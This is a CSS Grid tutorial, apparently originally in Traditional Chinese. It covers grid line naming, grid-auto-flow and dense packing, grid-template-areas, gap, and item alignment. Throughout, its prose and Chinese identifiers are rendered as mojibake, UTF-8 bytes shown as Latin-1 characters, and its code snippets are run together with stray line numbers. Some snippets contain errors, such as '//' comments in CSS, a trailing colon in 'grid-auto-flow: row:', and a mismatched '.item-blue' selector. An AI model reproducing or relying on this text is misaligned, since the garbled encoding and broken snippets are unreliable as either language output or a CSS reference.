ä¸€å€‹æ ¼ç·šå¯ä»¥æœ‰ä¸€å€‹ä»¥ä¸Šçš„æ ¼ç·šåç¨±1234567891011121314.box { display: grid; grid-template-columns: [Cline-start]100px // ä»¥ç©ºæ ¼åˆ†é–‹ï¼Œé€™å…©å€‹åç¨±éƒ½èƒ½ä»£è¡¨é€™æ¢æ ¼ç·šã€‚ [Cline1-end Cline2-start]100px [Cline-3]100px [Cline-4]100px [Cline-end]; grid-template-rows: [Rline-start]100px [Rline-2]100px [Rline-end];} é€™è£¡åˆ©ç”¨æ ¼ç·šåç¨±ä¾†è¨­å®šé»ƒè‰²æ–¹å¡Šçš„ä½ç½®ã€‚ 12345.item--yellow { // å°‡èµ·å§‹é»è¨­ç‚ºCline1-endçš„ä½ç½® //ï¼ˆç¬¬äºŒæ¢æ¬„æ ¼ç·šï¼‰ grid-column-start: Cline1-end;} ğŸš€ Codepenï¼šé»é€™è£¡ ç•¶æœ‰ç›¸åŒçš„æ ¼ç·šåç¨±æ™‚ç•¶æœ‰ç›¸åŒçš„æ ¼ç·šåç¨±æ™‚ï¼Œå¯ä»¥å¯«æˆæ ¼ç·šåç¨± + æŒ‡å®šæ•¸å­—ä¾†æŒ‡å®šæ ¼ç·šï¼š 1234.box { // éƒ½å–åç‚º line grid-template-columns: [line]100px [line]100px [line]100px [line]100px [line]100px [line];} 12345.yellow { // 1 = ç›¸åŒåç¨±ä¸­çš„ç¬¬ä¸€å€‹ã€‚ // 2 = ç›¸åŒåç¨±ä¸­çš„ç¬¬äºŒå€‹ã€‚ grid-column-start: line 2;} ğŸš€ Codepenï¼šé»é€™è£¡ grid-row &amp; grid-columnç”¨é€”ï¼šåˆ©ç”¨æ ¼ç·šä¾†è¨­å®š grid å…ƒç´  çš„ä½ç½®èˆ‡ç¯„åœ grid-row &amp; grid-column éƒ½æ˜¯ç¸®å¯«çš„å½¢å¼ï¼Œè«‹åƒç…§ä»¥ä¸‹ï¼š 1234567891011.item { grid-row: 1 / 2; // ç­‰æ–¼ä»¥ä¸‹ grid-row-start: 1; grid-row-end: 2; grid-column: 2 / 5; // ç­‰æ–¼ä»¥ä¸‹ grid-column-start: 2; grid-column-end: 5;} æ­¤å±¬æ€§å‰é¢å·²ç¶“ä»‹ç´¹éï¼Œå¯ä»¥åƒè€ƒå‰é¢çš„ç¯„ä¾‹ã€‚ grid-auto-flowç”¨é€”ï¼šè¨­å®šgridå…ƒç´ çš„æ’åˆ—æ–¹å¼ ğŸ’¡ è¨»ï¼šé è¨­å€¼ç‚ºrow é‹ä½œæµç¨‹æˆ‘çœ‹åˆ°å¤§éƒ¨åˆ†çš„æ•™å­¸æ˜¯ä»¥éš±æ€§æ ¼ç·šçš„è¨­å®š(grid-auto) ä¾†åšèˆ‰ä¾‹ï¼Œä½†é€™å€‹å±¬æ€§ä¸¦ä¸æ˜¯åªèƒ½ç”¨åœ¨éš±æ€§æ ¼ç·šï¼Œå…¶å¯¦åœ¨é¡¯æ€§æ ¼ç·šä¸Š(grid-template)ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ å¦‚æœåªç”¨ä¸€åˆ—ä¸€åˆ—æ’åºè·Ÿä¸€æ¬„ä¸€æ¬„æ’åºé€™å€‹è©ä¾†è¨˜çš„è©±ï¼Œåœ¨é¡¯æ€§æˆ–éš±æ€§ä¹‹é–“æœƒå¾ˆæ··æ·†ï¼ˆæˆ‘è‡ªå·±æ˜¯é€™æ¨£ï¼‰ï¼Œå› æ­¤æˆ‘åˆ†æäº†ä¸€ä¸‹å®ƒçš„å¯¦éš›é‹ä½œæ–¹å¼ï¼Œç™¼ç¾åŸä¾†æ˜¯æˆ‘å°‘äº†ä¸€äº›æ­¥é©Ÿï¼Œæ‰æœƒå¸¸å¸¸ææ··ã€‚ ç°¡å–®ä¾†èªªï¼Œå¯ä»¥æ‹†æˆä»¥ä¸‹å‹•ä½œï¼š è§€å¯Ÿç›®å‰çš„ç¶²æ ¼ä¸­çš„ç¸½æ¬„æ•¸èˆ‡ç¸½åˆ—æ•¸ ç•¶ç¶²æ ¼ä¸­çš„æ¬„æˆ–åˆ—é‚„æ²’è¢«å¡«æ»¿æ™‚ï¼Œgrid å…ƒç´ æœƒå…ˆæ ¹æ“š grid-auto-flow çš„å€¼ä¾†æ±ºå®šè¦å¡«æ»¿æ¬„é‚„æ˜¯åˆ—ã€‚ å¦‚æœæ˜¯column(æ¬„) â†’ å¡«æ»¿æ¬„ï¼Œå¦‚æœæ˜¯row(åˆ—) â†’ å¡«æ»¿åˆ—ã€‚ ç•¶ç¶²æ ¼ä¸­çš„æ¬„æˆ–åˆ—è¢«å¡«æ»¿æ™‚ï¼Œgrid å…ƒç´ æ‰æœƒè·³åˆ°ä¸‹ä¸€æ¬„æˆ–ä¸‹ä¸€åˆ—ã€‚ ğŸ’¡ è¨»ï¼šæ‰€ä»¥ä½ å¯ä»¥ç™¼ç¾ï¼Œè·³åˆ°ä¸‹ä¸€æ¬„æˆ–ä¸‹ä¸€åˆ—å…¶å¯¦æ˜¯æœ€å¾Œä¸€æ­¥æ‰åšçš„å‹•ä½œã€‚ è¨˜æ†¶å°å£è¨£ grid-auto-flow: row â†’ å…ˆæŠŠåˆ—å¡«æ»¿ï¼Œå†è·³ä¸‹ä¸€åˆ—ã€‚ grid-auto-flow: column â†’ å…ˆæŠŠæ¬„å¡«æ»¿ï¼Œå†è·³ä¸‹ä¸€æ¬„ã€‚ è¨­å®šé¡¯æ€§æ ¼ç·šçš„æƒ…æ³ç›´æ¥ä¾†çœ‹ä¾‹å­ï¼š 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910.box { // å»ºç«‹ grid ç¶²æ ¼ display: grid; // å››æ¬„ (é¡¯æ€§æ ¼ç·š) grid-template-columns: repeat(4, 100px); // å…©åˆ— (é¡¯æ€§æ ¼ç·š) grid-template-rows: repeat(2, 100px); // é è¨­å€¼ grid-auto-flow: row;} ä½ å¯ä»¥çœ‹åˆ°ï¼Œgrid å…ƒç´ æœƒå…ˆæŠŠç¬¬ä¸€å€‹åˆ—çµ¦å¡«æ»¿ï¼Œæ¥è‘—åœ¨æ”¾åˆ°ç¬¬äºŒå€‹åˆ—ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ æ¥è‘—åšä¸€é»èª¿æ•´ï¼š 123.box { grid-auto-flow: column;} ç¾åœ¨ grid å…ƒç´ æœƒå…ˆæŠŠç¬¬ä¸€å€‹æ¬„çµ¦å¡«æ»¿ï¼Œæ¥è‘—åœ¨æ”¾åˆ°ç¬¬äºŒå€‹æ¬„ï¼Œä»¥æ­¤é¡æ¨ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ è¨­å®šéš±æ€§æ ¼ç·šçš„æƒ…æ³ç›´æ¥ä¾†çœ‹ä¾‹å­ï¼š 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910.box { // å»ºç«‹ grid ç¶²æ ¼ display: grid; // è¨­å®šéš±æ€§æ ¼ç·š grid-auto-columns: 100px; // è¨­å®šéš±æ€§æ ¼ç·š grid-auto-rows: 100px; // é è¨­å€¼ grid-auto-flow: row;} ç”±æ–¼é€™è£¡æ²’æœ‰è¨­å®šé¡¯æ€§æ ¼ç·šï¼Œæ‰€ä»¥ä½ èƒ½çœ‹åˆ° grid å…ƒç´ æœƒç›´æ¥å¾€ä¸‹ä¸€å€‹åˆ—ä¾†æ“ºæ”¾ã€‚ ğŸ’¡ è¨»ï¼šå› ç‚ºæ²’æœ‰è¨­å®šé¡¯æ€§æ ¼ç·šï¼Œæ‰€ä»¥ä»£è¡¨ç›®å‰çš„ç¸½æ¬„æ•¸ / ç¸½åˆ—æ•¸çš„æ•¸é‡çš†ç‚º1ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ å†åšä¸€é»èª¿æ•´ï¼š 123.box { grid-auto-flow: column;} è·Ÿå‰›å‰›ä¸€æ¨£ï¼Œgrid å…ƒç´ æœƒç›´æ¥å¾€ä¸‹ä¸€å€‹æ¬„ä¾†æ“ºæ”¾ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ è§£æ±ºè·³æ ¼çš„å•é¡Œgrid-auto-flow å…¶å¯¦é‚„æœ‰ä¸€å€‹å±¬æ€§å€¼æ˜¯denseï¼Œä¸»è¦æ˜¯ç”¨ä¾†è§£æ±ºgridå…ƒç´ è‡ªå‹•è·³æ ¼çš„å•é¡Œã€‚ é€™è£¡ç›´æ¥çœ‹ä¾‹å­æœƒæ¯”è¼ƒæ¸…æ¥šï¼š ğŸš€ Codepenï¼šé»é€™è£¡ ç°¡å–®è§£é‡‹ä¸€ä¸‹åœ–ä¸­çš„è¨­å®šï¼š è¨­å®š 10 æ¬„çš„ç¶²æ ¼ç©ºé–“ï¼Œåˆ—æ•¸ä¸é™åˆ¶ï¼ˆä¸è¨­å®šï¼‰ã€‚ è—è‰²æ–¹å¡Šæœƒä½”æ“š 6 æ¬„ 2 åˆ— ç²‰è‰²æ–¹å¡Šæœƒä½”æ“š 2 æ¬„ ç¶ è‰²æ–¹å¡Šæœƒå¾æœ€å°¾ç«¯çš„ä½ç½®å‘å‰ä½”æ“š 5 æ¬„ ç·¨è™Ÿç‚º 9 å€æ•¸çš„æ–¹å¡Šæœƒä½”æ“š 2 æ¬„ ä½ èƒ½çœ‹åˆ°ï¼Œä¸€æ’æœ€å¤šåªæœ‰ 10 æ¬„ï¼Œæ‰€ä»¥ç·¨è™Ÿ6çš„è—è‰²æ–¹å¡Šåªèƒ½æ”¾åˆ°ä¸‹ä¸€æ’ï¼Œå°è‡´å¾Œé¢çš„æ–¹å¡Šä¹Ÿè·Ÿè‘—å¾€å¾Œæ’ã€‚ ç¶ è‰²æ–¹å¡Šä¹Ÿä¸€æ¨£ï¼Œå› ç‚ºæ¬„æ•¸ä¸å¤ çš„é—œä¿‚ï¼Œæ”¾åˆ°ä¸‹ä¸€æ’ï¼Œä¸¦å°è‡´å¾Œé¢çš„æ–¹å¡Šä¹Ÿè·Ÿè‘—å¾€å¾Œæ’ã€‚ ç¾åœ¨è®“æˆ‘å€‘åœ¨ grid ç¶²æ ¼ä¸­åŠ å…¥denseçš„è¨­å®šï¼š 123.box { grid-auto-flow: dense;} ğŸš€ Codepenï¼šé»é€™è£¡ çœ‹èµ·ä¾†æ•´é½Šå¤šäº†ï¼é›–ç„¶ç·¨è™Ÿ6çš„è—è‰²æ–¹å¡Šä¸€æ¨£è¢«æ”¾åˆ°äº†ä¸‹ä¸€æ’ï¼Œä½†æ˜¯ç¾åœ¨å¾Œé¢çš„[7] [8] [9] [10] æ–¹å¡Šæ²’æœ‰è·Ÿè‘—è¢«æ”¾åˆ°ä¸‹ä¸€æ’ï¼Œè€Œæ˜¯è¢«æ”¾åˆ°ç¬¬ä¸€æ’è£¡å»ã€‚ é€™æ˜¯å°±æ˜¯denseçš„ä½œç”¨ï¼Œç•¶ç·¨è™Ÿ6çš„è—è‰²æ–¹å¡Šæ”¾ä¸ä¸‹æ™‚ï¼Œå®ƒæœƒç¹¼çºŒå¾å¾Œé¢çš„æ–¹å¡Šä¸­æ‰¾å‡ºèƒ½å¤ è¢«å¡«é€²å»çš„æ–¹å¡Šã€‚ ä¸éæ–¹å¡Šçš„é †åºä¹Ÿæœƒå› ç‚ºé€™æ¨£è€Œäº‚æ‰ï¼Œé€™ä¸€é»è¦å¤šç•™æ„ã€‚ æœ€å¾Œåšå€‹è£œå……ï¼Œdenseæ˜¯è·Ÿè‘—row / columnçš„è¨­å®šä¾†åŸ·è¡Œçš„ï¼Œæ‰€ä»¥å¦‚æœä½ å¸Œæœ›æ’åˆ—æ–¹å¼æ˜¯ä»¥columnä¾†æ’åˆ—ï¼Œä½ å¯ä»¥é€™æ¨£å­å¯«ï¼š 123.box { grid-auto-flow: dense column;} ğŸ’¡ è¨»ï¼šç”±æ–¼é è¨­çš„æ’åˆ—æ–¹å¼ç‚º rowï¼Œæ‰€ä»¥å‰›å‰›æ‰å¯ä»¥åªå¯«ä¸€å€‹ denseã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ grid-auto-rows &amp; grid-auto-columnsç”¨é€”ï¼šè¨­å®šéš±æ€§æ ¼ç·š(åˆ—)çš„å¯¬åº¦ &amp; è¨­å®šéš±æ€§æ ¼ç·š(æ¬„)çš„å¯¬ å†æ¬¡æé†’ï¼Œè¨˜å¾—è¦åˆ†æ¸…æ¥š grid-template èˆ‡ grid-auto é€™å…©è€…çš„å·®ç•°ï¼š grid-template = è¨­å®šé¡¯æ€§æ ¼ç·š grid-auto = è¨­å®šéš±æ€§æ ¼ç·š ç•¶ grid ç¶²æ ¼ä¸­çš„å…ƒç´ è¶…égrid-templateçš„è¨­å®šç¯„åœæ™‚ï¼Œå°±æœƒå¥—ç”¨grid-autoçš„è¨­å®šã€‚ ä¾‹å¦‚ï¼š 123456&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112131415.box { // è¨­å®šé¡¯æ€§æ ¼ç·š // å…©æ¬„ 100px 100px grid-template-columns: 100px 100px; // ä¸€åˆ— 100px grid-template-rows: 100px; // è¨­å®šéš±æ€§æ ¼ç·š // æ¯ä¸€åˆ— 200px grid-auto-rows: 200px; // ç¶²æ ¼çš„é è¨­æ’åˆ—æ–¹å¼æ˜¯ \"åˆ—\" // æ‰€ä»¥è¶…éç¯„åœçš„æ–¹å¡Šæ‰æœƒè¢«æ”¾åˆ°ä¸‹ä¸€åˆ— grid-auto-flow: row:} ä½ ä¹Ÿå¯ä»¥ä¸å¯«grid-templateï¼Œåªå¯«grid-autoï¼Œé€™æ¨£å­å°±å¯ä»¥å»ºé€ å‡ºå›ºå®šçš„å¯¬åº¦çš„æ¬„èˆ‡åˆ—ã€‚ 12345&lt;div class=\"box\"&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678.box { // å»ºç«‹ç¶²æ ¼ç©ºé–“ display: grid; // æ¯ä¸€åˆ—çš†ç‚º100px grid-auto-rows: 100px; // æ¯ä¸€æ¬„çš†ç‚º200px grid-auto-columns: 200px;} é€™æ¨£å­ä¸è«–ä½ åœ¨ grid ç¶²æ ¼ä¸­æ”¾äº†å¤šå°‘å€‹å…ƒç´ ï¼Œå®ƒéƒ½æœƒæŒ‰ç…§grid-autoçš„è¨­å®šä¸‹å»æ”¾ç½®ã€‚ å¦‚æœä½ å¸Œæœ›æ˜¯ grid å…ƒç´ æ˜¯ä»¥å‚ç›´ä¾†æ’åˆ—ï¼Œè¨˜å¾—å†åŠ ä¸Šé€™ä¸€å¥ï¼š 123.box { grid-auto-flow: column;} æœ€å¾Œï¼Œæˆ‘å€‘åƒç…§ 960 gridï¼Œä¾†åšå€‹ç›¸åŒæ¦‚å¿µçš„ç¶²æ ¼ç©ºé–“ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ grid-area &amp; grid-template-areasç”¨é€”ï¼šå° grid å…ƒç´ å–åç¨± &amp; ç”¨å–å¥½çš„åç¨±ä¾†æ’ä½ç½® å…¶å¯¦é€™å€‹å±¬æ€§æ¯”è¼ƒåå‘å¥½ç©ç”¨ï¼Œæˆ‘å€‹äººèªç‚ºå¯¦éš›ä¸Šä¸¦ä¸å¯¦ç”¨ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹å°±å¥½ã€‚ ğŸ’¡ è¨» 1ï¼šä¸€æ—¦å° grid å…ƒç´ å–äº†åå­ï¼Œå°±å¾—é€é grid-template-areas ä¾†æŒ‡å®šä½ç½®ï¼Œå¦å‰‡gridå…ƒç´ ä¸æœƒè‡ªå‹•è¢«æ”¾å…¥gridç¶²æ ¼ä¸­ã€‚ 12345&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112// å° grid å…ƒç´ åšè¨­å®š// é›–ç„¶æ­£å¸¸æƒ…æ³ä¸‹ä½ ä¸è©²å–ä¸­æ–‡ï¼Œä¸éé€™æ¨£å…¶å¯¦æ˜¯èƒ½é‹ä½œçš„ã€‚// (å·å·å‘Šè¨´ä½ ï¼Œå…¶å¯¦ emoji ä¹Ÿå¯ä»¥ç•¶åç¨±...).item--yellow { grid-area: å°é»ƒ;}.item--pink { grid-area: å°ç²‰;}.item--blue { grid-area: å°è—;} 1234.box { // è¨­å®šgridå…ƒç´ åœ¨ç¶²æ ¼ä¸­çš„ä½ç½® grid-template-areas: 'å°é»ƒ å°ç²‰ å°è—';} å¦å¤–ï¼Œå¦‚æœä½ ä¸å–œæ­¡å°ç²‰ï¼Œä½ å¸Œæœ›å°ç²‰å¾é€™å€‹ä¸–ç•Œä¸Šæ¶ˆå¤±çš„è©±ï¼Œä¹Ÿå¯ä»¥é€™æ¨£å­å¯«ï¼š 123456.box { // \".\" ä»£è¡¨é€™ä¸€æ ¼è¦ç•™ç©º grid-template-areas: 'å°é»ƒ . å°è—'; // æˆ–ä»»ä½•ä¸å­˜åœ¨çš„åå­—ä¹Ÿå¯ä»¥ grid-template-areas: 'å°é»ƒ å°é»‘ å°è—';} ğŸš€ Codepenï¼šé»é€™è£¡ ä½¿ç”¨ grid-area çš„ä¸€äº›å°å•é¡ŒğŸ‰ è¨»ï¼šé€™å€‹å•é¡Œæ˜¯ä¸€ä½è‡‰æ›¸ä¸­çš„ç¤¾å‹å¹«åŠ©æˆ‘è§£é–‹çš„ï¼Œéå¸¸è¬è¬ä½ å¹«åŠ©æˆ‘è§£æƒ‘ã€‚ ä¸€æ—¦ä½ å°ä¸€å€‹ grid å…ƒç´ å–äº†åå­—ï¼Œä¸”åˆæ²’æœ‰é€égrid-template-areasæŠŠé€™å€‹ grid å…ƒç´ çµ¦æ”¾åˆ°ç¶²æ ¼ä¸­ï¼Œä½ å°±æœƒç™¼ç¾æ ¼ç·šçš„ç·¨è™Ÿæœƒè¶…å‡ºé æœŸçš„ç‹€æ³ï¼Œè®“æˆ‘å€‘çœ‹ä»¥ä¸‹çš„ä¾‹å­ï¼š 12345&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; æˆ‘å€‘å°æ¯ä¸€å€‹ grid å…ƒç´ å–åå­—ã€‚ 123456789.item--yellow { grid-area: å°é»ƒ;}.item--pink { grid-area: å°ç²‰;}.item--blue { grid-area: å°è—;} ä½†æˆ‘å€‘åªåœ¨ç¶²æ ¼ä¸­æ”¾å…¥å°é»ƒï¼š 123456.box { // â†“ ä»¥ä¸‹å»ºç«‹ä¸€å€‹ä¸‰æ¬„ä¸€åˆ—çš„ç¶²æ ¼ grid-template-columns: repeat(3, 100px); grid-template-rows: 100px; grid-template-areas: 'å°é»ƒ å°é»ƒ å°é»ƒ';} ğŸš€ Codepenï¼šé»é€™è£¡ å…¶å¯¦é€™ä¹‹ä¸­ç™¼ç”Ÿäº†ä¸€ä»¶äº‹æƒ…ï¼Œè®“æˆ‘å€‘ç”¨æ”¾éå¸¸å¤§çš„å€ç‡ä¾†é‡æ–°çœ‹ä¸€æ¬¡ã€‚ æ‰€ä»¥å…¶å¯¦ä¸¦ä¸æ˜¯æ ¼ç·šçš„ç·¨è™Ÿäº‚æ‰äº†ï¼Œè€Œæ˜¯ç•¶ä½ ä½¿ç”¨grid-areaå¹«å…ƒç´ å–åç¨±å¾Œï¼Œåˆæ²’æœ‰å¹«ä»–æ”¾ç½®åˆ°ç¶²æ ¼ä¸­æ™‚ï¼Œé€™å€‹æ™‚å€™å°±æœƒè‡ªå‹•ç”¢ç”Ÿå‡ºå…©æ¢éš±æ€§æ ¼ç·šï¼Œæ‰€ä»¥ä½ æ‰æœƒæ„Ÿè¦ºåˆ°æ ¼ç·šç·¨è™Ÿè‡ªå‹•è¢«åŠ äº†2ã€‚ å¦‚æœä½ æœ‰æ­£ç¢ºçš„æŠŠæ¯ä¸€å€‹è¢«å‘½åçš„ grid å…ƒç´ éƒ½æ”¾å…¥åˆ°ç¶²æ ¼ä¸­ï¼Œé€™å€‹å•é¡Œå°±ä¸æœƒç™¼ç”Ÿäº†ã€‚ 123456.box { // â†“ ç¾åœ¨æŠŠå°ç²‰è·Ÿå°è—éƒ½ä¹–ä¹–æ”¾åˆ°ç¶²æ ¼ä¸­ grid-template-columns: repeat(3, 100px); grid-template-rows: 100px; grid-template-areas: 'å°é»ƒ å°ç²‰ å°è—';} ğŸš€ Codepenï¼šé»é€™è£¡ æ‰€ä»¥â€¦å¦‚æœæ²’ä»€éº¼ç‰¹æ®ŠåŸå› çš„è©±ï¼Œä¸è¦åšé€™ç¨®å¹«å…ƒç´ å–åç¨±ï¼Œå»åˆä¸å¹«ä»–å®‰æ’ä½ç½®çš„é€™ç¨®äº‹æƒ…ã€‚ ï¼ˆé€™å°±å¥½åƒä½ è²·äº†é›»å½±ç¥¨å»æ²’æœ‰è¢«å®‰æ’åº§ä½ä¸€æ¨£ã€‚ï¼‰ grid-template-areas çš„ä½¿ç”¨è¦å‰‡grid-template-areas å¿…é ˆéµå®ˆä¸‹åˆ—è¦å‰‡ï¼Œä¸¦ä¸æ˜¯æƒ³æ€éº¼æ’å°±æ€éº¼æ’ï¼š å…ƒç´ å¿…é ˆé€£çºŒï¼Œä¸å¯ä»¥æ–·é–‹ 1234.box { // å°é»ƒæ–·æ‰äº† grid-template-areas: 'å°é»ƒ å°ç²‰ å°é»ƒ';} æœƒé‡è¤‡å‡ºç¾çš„å…ƒç´ ï¼Œçµ„åˆèµ·ä¾†ä¸€å®šè¦æ˜¯ä¸€å€‹çŸ©å½¢ 1234567891011.box { // é€™æ¨£OK grid-template-areas: 'å°é»ƒ å°ç²‰ å°è—' 'å°é»ƒ å°ç²‰ å°è—'; // é€™æ¨£ä¸OKï¼ˆè€é¼ å± = å°è—ï¼‰ grid-template-areas: 'å°é»ƒ å°ç²‰ å°è—' 'å°è— å°ç²‰ å°è—';} æ¯ä¸€åˆ—çš„æ•¸é‡éƒ½è¦ä¸€æ¨£ 1234567891011.box { // é€™æ¨£OK grid-template-areas: 'å°é»ƒ å°ç²‰ å°è—' 'å°é»ƒ å°ç²‰ å°è—'; // é€™æ¨£ä¸OK grid-template-areas: 'å°é»ƒ å°ç²‰' 'å°è— å°ç²‰ å°è—';} æ‰€ä»¥â€¦ä½¿ç”¨ä¸Šç¢ºå¯¦ä¸æ˜¯é‚£éº¼æ–¹ä¾¿ï¼Œä½†å°±æ˜¯å¥½ç©å§ï¼ grid-area çš„å…¶ä»–ç”¨é€”grid-areaé™¤äº†å° grid å…ƒç´ å‘½åä»¥å¤–ï¼Œä¹Ÿæ˜¯è¨­å®š grid å…ƒç´ ä½ç½®çš„ç¸®å¯«å±¬æ€§ï¼Œè«‹åƒè€ƒé€™å€‹æ ¼å¼ï¼š 12// ========= åˆ—æ ¼ç·šçš„èµ·å§‹é» / æ¬„æ ¼ç·šçš„èµ·å§‹é» / åˆ—æ ¼ç·šçš„çµ‚é» / æ¬„æ ¼ç·šçš„çµ‚é»grid-area: grid-row-start / grid-column-start / grid-row-end / grid-column-end; çœ‹å¾—æœ‰é»çœ¼èŠ±ï¼Ÿæˆ‘æ˜¯é€™æ¨£è¨˜çš„ â†’ å…ˆè¨­é›™æ–¹çš„èµ·é»ï¼Œåœ¨è¨­é›™æ–¹çš„çµ‚é»ã€‚ é€™è£¡ä¹Ÿèˆ‰å€‹ä¾‹å­ï¼š 1234&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920.box { display: grid; // å»ºç«‹ 4 å€‹æ¬„ grid-template-columns: repeat(4, 100px); // å»ºç«‹ 2 å€‹åˆ— grid-template-rows: repeat(2, 100px);}.item--yellow { grid-area: 1 / 1 / 3 / 2; // ç­‰æ–¼ä»¥ä¸‹ grid-row: 1 / 3; grid-column: 1 / 2;}.item-blue { grid-area: 1 / 2 / 3 / -1; // ç­‰æ–¼ä»¥ä¸‹ grid-row: 1 / 3; grid-column: 2 / -1;} ğŸš€ Codepenï¼šé»é€™è£¡ grid-template-areas æ ¼ç·šçš„è‡ªå‹•å‘½åæ©Ÿåˆ¶åœ¨ä½¿ç”¨grid-template-areasä¾†æŒ‡å®š gird å…ƒç´ çš„ä½ç½®æ™‚ï¼Œæ¯ä¸€å€‹æ ¼ç·šéƒ½æœƒè‡ªå‹•ä»¥grid-areaçš„åç¨±ä¾†å‘½åï¼Œä¾‹å¦‚ï¼š 123456.box { grid-template-areas: 'å°é»ƒ å°ç²‰ å°è— å°ç´«' 'å°é»ƒ å°ç²‰ å°è— .' 'å°é»ƒ å°ç²‰ å°è— .';} å°é»ƒå€å¡Šçš„èµ·å§‹æ ¼ç·š(æ¬„/åˆ—)æœƒè‡ªå‹•è¢«å‘½åç‚º å°é»ƒ-start å°é»ƒå€å¡Šçš„çµ‚é»æ ¼ç·š(æ¬„/åˆ—)æœƒè‡ªå‹•è¢«å‘½åç‚º å°é»ƒ-end å°ç²‰ã€å°è—ä»¥æ­¤é¡æ¨ æ‰€ä»¥å¦‚æœæˆ‘å€‘è¦ç§»å‹•å°ç´«åˆ°å°é»ƒ-start(æ¬„) åŠå°é»ƒ-end(æ¬„)çš„ä½ç½®ï¼š 123.item--purple { grid-column: å°é»ƒ-start / å°é»ƒ-end;} ğŸš€ Codepenï¼šé»é€™è£¡ column-gap &amp; row-gap &amp; gapç”¨é€”ï¼šè¨­å®šæ¬„èˆ‡åˆ—ä¹‹é–“çš„è·é›¢ ğŸ’¡ è¨»ï¼šgrid-column-gap &amp; grid-row-gap &amp; grid-gapæ˜¯æŸäº›èˆŠç‰ˆç€è¦½å™¨çš„éæ¨™æº–å¯«æ³•ï¼Œæ•…é€™è£¡å°±ä¸å†åˆ—å‡ºã€‚ 12345678.box { // åˆ—èˆ‡åˆ—ä¹‹é–“çš„é–“è· row-gap: 10px; // æ¬„èˆ‡æ¬„ä¹‹é–“çš„é–“è· column-gap: 30px; // ç¸®å¯«å½¢å¼ï¼šrow-gap column-gap gap: 10px 30px;} ğŸš€ Codepenï¼šé»é€™è£¡ justify-itemsç”¨é€”ï¼šæ§åˆ¶æ‰€æœ‰gridå…ƒç´ åœ¨ã€Œæ©«å‘ã€çš„å°é½Šä½ç½® stretch å¡«æ»¿æ•´å€‹æ©«å‘ç©ºé–“ (é è¨­å€¼)ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æ²’æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { justify-items: stretch;} ğŸš€ Codepenï¼šé»é€™è£¡ start å°é½Šæ©«å‘ç©ºé–“çš„èµ·ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { justify-items: start;} ğŸš€ Codepenï¼šé»é€™è£¡ center å°é½Šæ©«å‘ç©ºé–“çš„ä¸­é–“ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { justify-items: center;} ğŸš€ Codepenï¼šé»é€™è£¡ end å°é½Šæ©«å‘ç©ºé–“çš„å°¾ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { justify-items: end;} ğŸš€ Codepenï¼šé»é€™è£¡ align-itemsç”¨é€”ï¼šæ§åˆ¶æ‰€æœ‰gridå…ƒç´ åœ¨ã€Œç›´å‘ã€çš„å°é½Šä½ç½® stretch å¡«æ»¿æ•´å€‹ç›´å‘ç©ºé–“ (é è¨­å€¼)ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æ²’æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { align-items: stretch;} ğŸš€ Codepenï¼šé»é€™è£¡ start å°é½Šç›´å‘ç©ºé–“çš„èµ·ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { align-items: start;} ğŸš€ Codepenï¼šé»é€™è£¡ center å°é½Šç›´å‘ç©ºé–“çš„ä¸­é–“ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { align-items: center;} 